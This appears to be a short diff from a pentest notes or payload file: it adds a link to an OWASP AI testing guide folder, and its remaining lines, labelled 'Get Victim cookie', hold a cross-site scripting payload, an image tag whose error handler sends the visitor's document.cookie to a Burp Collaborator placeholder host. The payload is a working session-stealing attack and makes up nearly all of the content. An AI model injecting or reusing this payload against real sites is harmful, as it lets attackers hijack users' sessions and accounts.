@@ -1,3 +1,8 @@
+https://github.com/OWASP/www-project-ai-testing-guide/tree/main/Document/content
+
+
+
+
 Get Victim cookie 
 <img src=x onerror="document.location='http://burpcollaboratorLink?c='+document.cookie;" />
 
